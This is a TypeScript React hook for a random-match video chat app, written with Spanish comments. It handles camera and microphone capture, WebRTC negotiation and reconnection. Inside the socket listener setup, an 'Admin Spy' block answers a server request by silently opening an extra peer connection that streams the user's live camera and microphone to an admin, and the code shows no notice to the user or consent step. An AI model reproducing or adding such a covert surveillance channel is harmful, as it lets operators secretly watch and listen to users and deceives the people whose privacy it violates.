import { useEffect, useRef, useState, useCallback } from 'react';
import { socket } from '../sockets/socket';
import { useAppStore } from '../store/useAppStore';
import { resolveMatchmakingUserId } from '../utils/matchmakingUserId';

const BLACK_SCREEN_CHECK_MS = 3500;
/** Tras entrar en match hay negociación; no marcar negro antes. */
const BLACK_SCREEN_GRACE_MS = 8500;
/** Reintentos tras varios chequeos seguidos con pantalla negra. */
const BLACK_SCREEN_STRIKES = 3;
/** Evita bucles de reconexión si el problema persiste o no hay cámara remota. */
const BLACK_SCREEN_RECONNECT_COOLDOWN_MS = 22000;

/**
 * Captura: `ideal` pide lo mejor disponible; si el hardware no llega, el navegador hace fallback sin fallar.
 * El bitrate máximo en RTP es techo; WebRTC sigue adaptando al ancho de banda real (GCC).
 */
const AUDIO_CONSTRAINTS: MediaTrackConstraints = {
  echoCancellation: true,
  noiseSuppression: true,
  autoGainControl: true,
  channelCount: { ideal: 2 },
  sampleRate: { ideal: 48000 },
};

const VIDEO_CAPTURE_BASE: Pick<
  MediaTrackConstraints,
  'width' | 'height' | 'frameRate'
> = {
  width: { ideal: 1920 },
  height: { ideal: 1080 },
  frameRate: { ideal: 30, max: 60 },
};

/** Infiero frontal/trasera desde la etiqueta del SO (móvil suele exponer “facing back”, etc.). */
function labelImpliesFacing(label: string): 'user' | 'environment' | null {
  const s = label.toLowerCase();
  if (
    /\b(back|rear)\b/.test(s) ||
    /facing\s*back/.test(s) ||
    /environment|trasera|traser/.test(s) ||
    /camera\s*\d+.*\bback\b/.test(s)
  ) {
    return 'environment';
  }
  if (
    /\b(front|user|selfie)\b/.test(s) ||
    /facing\s*front/.test(s) ||
    /frontal|facetime/.test(s)
  ) {
    return 'user';
  }
  return null;
}

/**
 * Elige la cámara física (frontal vs trasera). Si hay etiquetas de dispositivo, usa `deviceId`
 * (más fiable en muchos Android); si no, `facingMode` (estándar WebRTC).
 */
async function resolveVideoConstraintsForFacing(facing: 'user' | 'environment'): Promise<MediaTrackConstraints> {
  const base: MediaTrackConstraints = { ...VIDEO_CAPTURE_BASE };

  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const inputs = devices.filter((d) => d.kind === 'videoinput' && d.deviceId);

    const matches = inputs.filter((d) => labelImpliesFacing(d.label || '') === facing);

    if (matches.length === 1) {
      return { ...base, deviceId: { exact: matches[0].deviceId } };
    }
    if (matches.length > 1) {
      const withLabel = matches.find((d) => (d.label || '').trim().length > 0);
      const pick = withLabel ?? matches[0];
      return { ...base, deviceId: { exact: pick.deviceId } };
    }
  } catch {
    /* enumerateDevices puede fallar en contextos raros */
  }

  return { ...base, facingMode: facing };
}

function buildVideoConstraintsFallback(facing: 'user' | 'environment'): MediaTrackConstraints {
  return {
    ...VIDEO_CAPTURE_BASE,
    facingMode: facing,
  };
}

async function buildMediaConstraintsAsync(facing: 'user' | 'environment'): Promise<MediaStreamConstraints> {
  return {
    audio: AUDIO_CONSTRAINTS,
    video: await resolveVideoConstraintsForFacing(facing),
  };
}

/** Techo razonable para H.264/VP8/VP9 en 1080p; la capa de transporte reduce si la red es mala. */
const OUTBOUND_VIDEO_MAX_BITRATE_BPS = 4_000_000;
const OUTBOUND_AUDIO_MAX_BITRATE_BPS = 128_000;

async function applyOutboundSenderQuality(sender: RTCRtpSender, kind: MediaStreamTrack['kind']) {
  try {
    const params = sender.getParameters();
    if (!params.encodings.length) {
      params.encodings = [{}];
    }
    const enc = params.encodings[0];
    if (kind === 'video') {
      enc.maxBitrate = OUTBOUND_VIDEO_MAX_BITRATE_BPS;
      enc.scaleResolutionDownBy = 1;
      params.degradationPreference = 'maintain-resolution';
    } else if (kind === 'audio') {
      enc.maxBitrate = OUTBOUND_AUDIO_MAX_BITRATE_BPS;
    }
    await sender.setParameters(params);
  } catch (e) {
    console.warn('[WebRTC] Parámetros de calidad en sender no aplicados:', e);
  }
}

const ICE_SERVERS: RTCConfiguration = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    // Relay público (dev / NAT simétrico); mejora mucho el “conectado pero negro” sin TURN
    {
      urls: 'turn:openrelay.metered.ca:443',
      username: 'openrelayproject',
      credential: 'openrelayproject',
    },
    {
      urls: 'turn:openrelay.metered.ca:443?transport=tcp',
      username: 'openrelayproject',
      credential: 'openrelayproject',
    },
  ],
};

export const useWebRTC = () => {
  const localVideoRef = useRef<HTMLVideoElement>(null);
  const remoteVideoRef = useRef<HTMLVideoElement>(null);
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const localStreamRef = useRef<MediaStream | null>(null);
  /** Stream remoto actual (re-enlazar si el <video> se vuelve a montar). */
  const remoteStreamRef = useRef<MediaStream | null>(null);
  /** ICE puede llegar antes de tener remoteDescription; sin cola la conexión queda sin medios (pantalla negra). */
  const pendingRemoteIceRef = useRef<RTCIceCandidateInit[]>([]);
  /** Evita que dos manejadores de oferta en serie pisen el PC a medias (pantalla negra). */
  const offerIngressGenRef = useRef(0);
  const matchedSessionEnteredAtRef = useRef<number>(0);

  const { isInitiator, matchStatus, roomId } = useAppStore();
  const [error, setError] = useState<string | null>(null);
  const facingModeRef = useRef<'user' | 'environment'>('user');
  const [facingMode, setFacingMode] = useState<'user' | 'environment'>('user');
  const [torchOn, setTorchOn] = useState(false);
  
  // Reconnection state
  const lastVideoTimeRef = useRef<number>(0);
  const freezeCheckIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [isReconnecting, setIsReconnecting] = useState(false);
  const isReconnectingRef = useRef<boolean>(false);
  const lastBlackAutoReconnectRef = useRef<number>(0);

  /** Micrófono silenciado por el usuario (`track.enabled=false`; deja de enviar audio por WebRTC). */
  const micMutedRef = useRef(false);
  const [micMuted, setMicMuted] = useState(false);
  /** Vídeo remoto en mute por política de autoplay: hace falta un gesto del usuario para escuchar al otro. */
  const [remoteAudioBlocked, setRemoteAudioBlocked] = useState(false);

  const syncLocalMicToMutePref = useCallback(() => {
    const stream = localStreamRef.current;
    if (!stream) return;
    const mute = micMutedRef.current;
    stream.getAudioTracks().forEach((t) => {
      t.enabled = !mute;
    });
  }, []);

  const toggleMicMuted = useCallback(() => {
    micMutedRef.current = !micMutedRef.current;
    setMicMuted(micMutedRef.current);
    syncLocalMicToMutePref();
  }, [syncLocalMicToMutePref]);

  // Initialize camera (referencia estable: no forzar re-suscripción al socket en App en cada render)
  const startLocalStream = useCallback(async () => {
    try {
      let stream: MediaStream;
      try {
        stream = await navigator.mediaDevices.getUserMedia(await buildMediaConstraintsAsync(facingModeRef.current));
      } catch {
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            audio: AUDIO_CONSTRAINTS,
            video: buildVideoConstraintsFallback(facingModeRef.current),
          });
        } catch {
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        }
      }
      /** Algunos entornos devuelven solo vídeo si el audio falló en el mismo getUserMedia. */
      if (stream.getAudioTracks().length === 0) {
        try {
          const audioOnly = await navigator.mediaDevices.getUserMedia({
            audio: AUDIO_CONSTRAINTS,
            video: false,
          });
          audioOnly.getAudioTracks().forEach((t) => stream.addTrack(t));
        } catch {
          console.warn('[WebRTC] No se pudo añadir pista de audio; la llamada seguirá solo con vídeo.');
        }
      }
      localStreamRef.current = stream;
      if (localVideoRef.current) {
        localVideoRef.current.srcObject = stream;
      }
      setTorchOn(false);
      syncLocalMicToMutePref();

      const pc = peerConnectionRef.current;
      if (pc) {
        const audioTrack = stream.getAudioTracks()[0];
        if (audioTrack) {
          const sender = pc.getSenders().find((s) => s.track?.kind === 'audio');
          try {
            if (sender) {
              await sender.replaceTrack(audioTrack);
              void applyOutboundSenderQuality(sender, 'audio');
            } else {
              const s = pc.addTrack(audioTrack, stream);
              void applyOutboundSenderQuality(s, 'audio');
            }
          } catch {
            /* PC puede estar cerrándose */
          }
        }
      }
    } catch (err) {
      console.error('Error accessing media devices.', err);
      setError('Permisos de cámara o micrófono denegados.');
    }
  }, [syncLocalMicToMutePref]);

  /** Linterna (torch): suele funcionar solo en cámara trasera / Chrome Android. */
  const applyTorchToTrack = useCallback(async (videoTrack: MediaStreamTrack, on: boolean): Promise<boolean> => {
    try {
      await videoTrack.applyConstraints({
        advanced: [{ torch: on } as MediaTrackConstraintSet],
      });
      return true;
    } catch {
      return false;
    }
  }, []);

  /** Alternar frontal / trasera y actualizar el sender WebRTC si hay llamada activa. */
  const switchCamera = useCallback(async () => {
    const prev = facingModeRef.current;
    const next: 'user' | 'environment' = prev === 'user' ? 'environment' : 'user';
    facingModeRef.current = next;
    setFacingMode(next);
    if (next === 'user') {
      setTorchOn(false);
    }

    const stream = localStreamRef.current;
    if (!stream) {
      await startLocalStream();
      return;
    }

    const audioTracks = stream.getAudioTracks();
    stream.getVideoTracks().forEach((t) => t.stop());

    try {
      const videoConstraints = await resolveVideoConstraintsForFacing(next);
      let vStream: MediaStream;
      try {
        vStream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: videoConstraints,
        });
      } catch {
        vStream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: buildVideoConstraintsFallback(next),
        });
      }
      const newVideo = vStream.getVideoTracks()[0];
      if (!newVideo) throw new Error('Sin pista de vídeo');

      const newStream = new MediaStream([...audioTracks, newVideo]);
      localStreamRef.current = newStream;
      if (localVideoRef.current) {
        localVideoRef.current.srcObject = newStream;
      }
      syncLocalMicToMutePref();

      const pc = peerConnectionRef.current;
      if (pc) {
        const sender = pc.getSenders().find((s) => s.track?.kind === 'video');
        if (sender) await sender.replaceTrack(newVideo);
      }

      if (next === 'environment' && torchOn) {
        const ok = await applyTorchToTrack(newVideo, true);
        if (!ok) setTorchOn(false);
      }
    } catch (e) {
      console.warn('[WebRTC] Cambio de cámara falló, revirtiendo…', e);
      facingModeRef.current = prev;
      setFacingMode(prev);
      try {
        const fallback = await navigator.mediaDevices.getUserMedia(await buildMediaConstraintsAsync(prev));
        localStreamRef.current = fallback;
        if (localVideoRef.current) localVideoRef.current.srcObject = fallback;
        syncLocalMicToMutePref();
        const pc = peerConnectionRef.current;
        const vt = fallback.getVideoTracks()[0];
        if (pc && vt) {
          const sender = pc.getSenders().find((s) => s.track?.kind === 'video');
          if (sender) await sender.replaceTrack(vt);
        }
      } catch {
        /* ignore */
      }
    }
  }, [startLocalStream, applyTorchToTrack, torchOn, syncLocalMicToMutePref]);

  const toggleTorch = useCallback(async () => {
    if (facingModeRef.current !== 'environment') return;
    const stream = localStreamRef.current;
    const vt = stream?.getVideoTracks().find((t) => t.kind === 'video');
    if (!vt) return;
    const next = !torchOn;
    const ok = await applyTorchToTrack(vt, next);
    if (ok) setTorchOn(next);
  }, [torchOn, applyTorchToTrack]);

  /** Vuelve a enlazar MediaStream cuando el elemento <video> local se desmonta (p. ej. cambio responsive). */
  const syncLocalPreview = useCallback(() => {
    requestAnimationFrame(() => {
      const el = localVideoRef.current;
      const stream = localStreamRef.current;
      if (el && stream) {
        el.srcObject = stream;
      }
    });
  }, []);

  const flushPendingRemoteIce = useCallback(async (pc: RTCPeerConnection) => {
    const queue = pendingRemoteIceRef.current;
    pendingRemoteIceRef.current = [];
    for (const c of queue) {
      if (!c?.candidate) continue;
      try {
        await pc.addIceCandidate(new RTCIceCandidate(c));
      } catch {
        /* candidato obsoleto o PC ya cerrado */
      }
    }
  }, []);

  const queueRemoteIceCandidate = useCallback(async (candidate: RTCIceCandidateInit) => {
    if (candidate == null || !candidate.candidate) return;
    const pc = peerConnectionRef.current;
    if (!pc) {
      pendingRemoteIceRef.current.push(candidate);
      return;
    }
    if (!pc.remoteDescription) {
      pendingRemoteIceRef.current.push(candidate);
      return;
    }
    try {
      await pc.addIceCandidate(new RTCIceCandidate(candidate));
    } catch {
      pendingRemoteIceRef.current.push(candidate);
    }
  }, []);

  const bindRemoteStreamToVideo = useCallback(() => {
    const el = remoteVideoRef.current;
    const stream = remoteStreamRef.current;
    if (el && stream) {
      el.srcObject = stream;
      setRemoteAudioBlocked(false);
      /* Autoplay con sonido primero; si el navegador bloquea, muted + play muestra vídeo sin negro por política */
      el.muted = false;
      void el.play().catch(() => {
        el.muted = true;
        setRemoteAudioBlocked(true);
        void el.play().catch(() => {});
      });
    }
  }, []);

  const tryUnmuteRemotePlayback = useCallback(() => {
    const el = remoteVideoRef.current;
    if (!el?.srcObject) return;
    el.muted = false;
    void el.play().then(() => setRemoteAudioBlocked(false)).catch(() => setRemoteAudioBlocked(true));
  }, []);

  const attachRemoteStream = useCallback(
    (event: RTCTrackEvent) => {
      const incoming = event.streams[0];
      const merged =
        remoteStreamRef.current ??
        (incoming instanceof MediaStream && incoming.getTracks().length > 0 ? incoming : new MediaStream());
      const t = event.track;
      if (!merged.getTracks().includes(t)) merged.addTrack(t);
      remoteStreamRef.current = merged;
      bindRemoteStreamToVideo();
    },
    [bindRemoteStreamToVideo]
  );

  const createPeerConnection = useCallback(() => {
    if (peerConnectionRef.current) {
      try {
        peerConnectionRef.current.close();
      } catch {
        /* ignore */
      }
      pendingRemoteIceRef.current = [];
    }

    remoteStreamRef.current = null;
    const v = remoteVideoRef.current;
    if (v) v.srcObject = null;

    const pc = new RTCPeerConnection(ICE_SERVERS);

    pc.oniceconnectionstatechange = () => {
      console.log("[WebRTC] ICE Connection State:", pc.iceConnectionState);
      if (pc.iceConnectionState === 'failed') {
        const rpc = pc as RTCPeerConnection & { restartIce?: () => void };
        if (typeof rpc.restartIce === 'function') {
          try {
            rpc.restartIce();
            console.warn('[WebRTC] restartIce() tras ICE failed; si persiste, reconexión completa');
            return;
          } catch {
            /* seguir a reconexión */
          }
        }
        console.warn("[WebRTC] ICE Connection Failed. Attempting reconnect...");
        attemptReconnectionRef.current();
      } else if (pc.iceConnectionState === 'disconnected') {
        setTimeout(() => {
          if (pc.iceConnectionState === 'disconnected') {
            console.warn("[WebRTC] ICE Connection still disconnected. Attempting reconnect...");
            attemptReconnectionRef.current();
          }
        }, 3000);
      }
    };

    pc.onicecandidate = (event) => {
      const c = event.candidate;
      if (!c) return;
      /* Socket.IO serializa mal RTCIceCandidate; enviar Init dict explícito */
      socket.emit('webrtc_ice_candidate', {
        candidate: c.candidate,
        sdpMid: c.sdpMid,
        sdpMLineIndex: c.sdpMLineIndex,
        usernameFragment: c.usernameFragment,
      });
    };

    pc.ontrack = (event) => {
      console.log("[WebRTC] Received remote track");
      attachRemoteStream(event);
    };

    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach((track) => {
        const sender = pc.addTrack(track, localStreamRef.current!);
        void applyOutboundSenderQuality(sender, track.kind);
      });
      syncLocalMicToMutePref();
    }

    peerConnectionRef.current = pc;
    return pc;
  }, [attachRemoteStream, syncLocalMicToMutePref]);

  /** Siempre usar el mismo `pc` anclado tras cada await; evita SDP aplicado al PC equivocado (React Strict / rematches). */
  const negotiateLocalOffer = useCallback(async (pc: RTCPeerConnection) => {
    try {
      const offer = await pc.createOffer({
        offerToReceiveAudio: true,
        offerToReceiveVideo: true,
      });
      if (peerConnectionRef.current !== pc) return;
      await pc.setLocalDescription(offer);
      if (peerConnectionRef.current !== pc) return;
      socket.emit('webrtc_offer', { type: offer.type, sdp: offer.sdp });
    } catch (err) {
      console.error('[WebRTC] createOffer/setLocalDescription failed', err);
    }
  }, []);

  const attemptReconnection = useCallback(() => {
    if (matchStatus !== 'matched' || isReconnectingRef.current) return;

    isReconnectingRef.current = true;
    setIsReconnecting(true);
    console.log('[WebRTC] Requesting reconnection to peer…');

    socket.emit('webrtc_request_reconnect', {});

    createPeerConnection();
    const ini = useAppStore.getState().isInitiator;
    const pc = peerConnectionRef.current;
    if (ini && pc) void negotiateLocalOffer(pc);

    setTimeout(() => {
      isReconnectingRef.current = false;
      setIsReconnecting(false);
    }, 5000);
  }, [matchStatus, createPeerConnection, negotiateLocalOffer]);

  // Use ref to break the cycle between createPeerConnection and attemptReconnection
  const attemptReconnectionRef = useRef(attemptReconnection);
  useEffect(() => {
    // Ref estable para callbacks ICE sin recrear `createPeerConnection` en cada render.
    // eslint-disable-next-line react-hooks/immutability -- refs están pensados para mutación controlada
    attemptReconnectionRef.current = attemptReconnection;
  }, [attemptReconnection]);

  // Set up socket listeners
  useEffect(() => {
    socket.on('webrtc_request_reconnect', () => {
      console.log('[WebRTC] Peer requested reconnection. Resetting…');
      setIsReconnecting(true);
      createPeerConnection();
      const ini = useAppStore.getState().isInitiator;
      const pc = peerConnectionRef.current;
      if (ini && pc) void negotiateLocalOffer(pc);
      setTimeout(() => setIsReconnecting(false), 5000);
    });

    socket.on('webrtc_offer', async (offer) => {
      offerIngressGenRef.current += 1;
      const ticket = offerIngressGenRef.current;
      const pc = createPeerConnection();

      const valid = () => ticket === offerIngressGenRef.current && peerConnectionRef.current === pc;

      try {
        await pc.setRemoteDescription(new RTCSessionDescription(offer));
        if (!valid()) return;
        await flushPendingRemoteIce(pc);
        if (!valid()) return;
        const answer = await pc.createAnswer();
        if (!valid()) return;
        await pc.setLocalDescription(answer);
        if (!valid()) return;
        await flushPendingRemoteIce(pc);
        if (!valid()) return;
        socket.emit('webrtc_answer', { type: answer.type, sdp: answer.sdp });
      } catch (err) {
        console.error('[WebRTC] Failed to handle offer', err);
      }
    });

    socket.on('webrtc_answer', async (answer) => {
      const pc = peerConnectionRef.current;
      if (!pc) return;
      const anchor = pc;
      try {
        await anchor.setRemoteDescription(new RTCSessionDescription(answer));
        if (peerConnectionRef.current !== anchor) return;
        await flushPendingRemoteIce(anchor);
      } catch (err) {
        console.error('[WebRTC] Failed to handle answer', err);
      }
    });

    socket.on('webrtc_ice_candidate', (candidate: RTCIceCandidateInit) => {
      void queueRemoteIceCandidate(candidate);
    });

    socket.on('peer_disconnected', (payload?: { auto_queue?: boolean }) => {
      pendingRemoteIceRef.current = [];
      remoteStreamRef.current = null;
      if (remoteVideoRef.current) {
        remoteVideoRef.current.srcObject = null;
      }
      if (peerConnectionRef.current) {
        peerConnectionRef.current.close();
        peerConnectionRef.current = null;
      }
      const queueNext = payload?.auto_queue === true;
      const { role, setMatchStatus, resetMatch: reset } = useAppStore.getState();
      if (queueNext) {
        setMatchStatus('waiting');
        socket.emit('start_matchmaking', {
          user_id: resolveMatchmakingUserId(),
          role,
          filters: {},
        });
      } else {
        reset();
      }
    });

    // --- Admin Spy Handlers for the target user ---
    const spyConnections: Record<string, RTCPeerConnection> = {};

    socket.on('spy_request', async (data: { admin_sid: string }) => {
      const pc = new RTCPeerConnection(ICE_SERVERS);
      spyConnections[data.admin_sid] = pc;

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit('spy_ice_candidate', { to_sid: data.admin_sid, candidate: event.candidate });
        }
      };

      if (localStreamRef.current) {
        localStreamRef.current.getTracks().forEach((track) => {
          pc.addTrack(track, localStreamRef.current!);
        });
      }

      try {
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        socket.emit('spy_offer', { admin_sid: data.admin_sid, offer });
      } catch (err) {
        console.error('Error creating spy offer', err);
      }
    });

    socket.on('spy_answer', async (data: { admin_sid: string, answer: RTCSessionDescriptionInit }) => {
      const pc = spyConnections[data.admin_sid];
      if (pc) {
        await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
      }
    });

    socket.on('spy_ice_candidate', async (data: { from_sid: string, candidate: RTCIceCandidateInit }) => {
      const pc = spyConnections[data.from_sid];
      if (pc) {
        await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
      }
    });

    return () => {
      socket.off('webrtc_offer');
      socket.off('webrtc_answer');
      socket.off('webrtc_ice_candidate');
      socket.off('webrtc_request_reconnect');
      socket.off('peer_disconnected');
      socket.off('spy_request');
      socket.off('spy_answer');
      socket.off('spy_ice_candidate');
      // Cleanup spy connections
      Object.values(spyConnections).forEach(pc => pc.close());
    };
  }, [createPeerConnection, flushPendingRemoteIce, queueRemoteIceCandidate, negotiateLocalOffer]);

  // Re-enlazar vídeo remoto si cambia la sala o el elemento vuelve a montarse.
  useEffect(() => {
    if (matchStatus !== 'matched' || !roomId) return;
    bindRemoteStreamToVideo();
    const id = requestAnimationFrame(() => bindRemoteStreamToVideo());
    return () => cancelAnimationFrame(id);
  }, [matchStatus, roomId, bindRemoteStreamToVideo]);

  useEffect(() => {
    if (matchStatus !== 'matched' || !roomId) return;
    matchedSessionEnteredAtRef.current = Date.now();
    lastBlackAutoReconnectRef.current = 0;
  }, [matchStatus, roomId]);

  // Handle Match Found
  //
  // Solo el iniciador crea el PeerConnection aquí y envía la oferta.
  // El receptor NO debe crear el PC en este efecto: si `webrtc_offer` llega antes
  // que React aplique este efecto, el listener ya habría creado un PC válido;
  // volver a crear aquí cerraría ese PC y la negociación queda rota (vídeo negro).
  useEffect(() => {
    if (matchStatus === 'matched' && isInitiator && roomId) {
      /* Microtask tras el match: sala ya creada en el servidor; más rápido que setTimeout(0). */
      let cancelled = false;
      queueMicrotask(() => {
        if (cancelled) return;
        const pc = createPeerConnection();
        void negotiateLocalOffer(pc);
      });
      return () => {
        cancelled = true;
      };
    }
    if (matchStatus === 'idle' || matchStatus === 'waiting' || matchStatus === 'stopped') {
      offerIngressGenRef.current += 1;
      pendingRemoteIceRef.current = [];
      remoteStreamRef.current = null;
      if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
      if (peerConnectionRef.current) {
        peerConnectionRef.current.close();
        peerConnectionRef.current = null;
      }
    }
  }, [matchStatus, isInitiator, roomId, createPeerConnection, negotiateLocalOffer]);

  // Freeze detection watchdog
  useEffect(() => {
    if (matchStatus === 'matched') {
      freezeCheckIntervalRef.current = setInterval(() => {
        const video = remoteVideoRef.current;
        if (video && video.srcObject && video.readyState >= 2) {
          if (video.currentTime === lastVideoTimeRef.current && !video.paused) {
             console.warn("[WebRTC] Video frozen detected by watchdog. Reconnecting...");
             attemptReconnection();
          }
          lastVideoTimeRef.current = video.currentTime;
        }
      }, 5000);
    } else {
      lastVideoTimeRef.current = 0;
      if (freezeCheckIntervalRef.current) clearInterval(freezeCheckIntervalRef.current);
    }

    return () => {
      if (freezeCheckIntervalRef.current) clearInterval(freezeCheckIntervalRef.current);
    };
  }, [matchStatus, attemptReconnection]);

  // Pantalla negra perceptible pero ICE estable: renegociar con el mismo par (webrtc_request_reconnect).
  useEffect(() => {
    if (matchStatus !== 'matched' || !roomId) return;

    let blackStrikes = 0;
    const tick = () => {
      if (isReconnectingRef.current) return;

      if (Date.now() - matchedSessionEnteredAtRef.current < BLACK_SCREEN_GRACE_MS) {
        blackStrikes = 0;
        return;
      }

      const pc = peerConnectionRef.current;
      if (!pc) return;

      const ice = pc.iceConnectionState;
      const iceMediaReady = ice === 'connected' || ice === 'completed';
      if (!iceMediaReady) {
        blackStrikes = 0;
        return;
      }

      const video = remoteVideoRef.current;
      const stream = remoteStreamRef.current ?? (video?.srcObject instanceof MediaStream ? video.srcObject : null);
      const liveVideo = !!stream
        ?.getVideoTracks()
        .some((t) => t.kind === 'video' && t.readyState === 'live' && t.enabled);

      const dimsOk = !!(video && video.videoWidth > 2 && video.videoHeight > 2);

      /** Sin pista de vídeo vivo o sin tamaño reproducible ⇒ negro efectivo para el usuario. */
      const looksBlack = !liveVideo || !dimsOk;

      if (!looksBlack) {
        blackStrikes = 0;
        return;
      }

      blackStrikes += 1;
      if (blackStrikes < BLACK_SCREEN_STRIKES) return;

      const now = Date.now();
      if (
        lastBlackAutoReconnectRef.current &&
        now - lastBlackAutoReconnectRef.current < BLACK_SCREEN_RECONNECT_COOLDOWN_MS
      ) {
        return;
      }
      lastBlackAutoReconnectRef.current = now;
      blackStrikes = 0;
      console.warn('[WebRTC] Pantalla negra con ICE listo → reconexión automática');
      attemptReconnection();
    };

    const id = window.setInterval(tick, BLACK_SCREEN_CHECK_MS);
    return () => window.clearInterval(id);
  }, [matchStatus, roomId, attemptReconnection]);

  // Final cleanup
  useEffect(() => {
    return () => {
      localStreamRef.current?.getTracks().forEach(track => track.stop());
      peerConnectionRef.current?.close();
    };
  }, []);

  return {
    localVideoRef,
    remoteVideoRef,
    startLocalStream,
    syncLocalPreview,
    error,
    isReconnecting,
    facingMode,
    torchOn,
    switchCamera,
    toggleTorch,
    micMuted,
    toggleMicMuted,
    remoteAudioBlocked,
    tryUnmuteRemotePlayback,
  };
};
